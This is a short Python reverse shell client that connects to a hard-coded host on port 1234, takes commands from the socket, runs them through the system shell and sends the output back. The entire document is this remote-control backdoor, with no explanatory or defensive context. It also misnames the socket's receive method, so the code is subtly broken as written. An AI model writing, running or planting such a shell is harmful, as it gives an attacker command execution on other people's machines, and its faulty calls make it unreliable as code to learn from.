import socket
import subprocess

host="10.0.0.3"
port= 1234
buffer=1000

mysocket= socket.socket()
mysocket.connect((host,port))

while True:
    try:
        command= mysocket.receive(buffer).decode()
        command= command.split()
        print(command)
        if "exit" in command:
            mysocket.close()
            break
        output= subprocess.check_output(command,shell=True)
        mysocket.send(output)
    except:
        continue

mysocket.close()

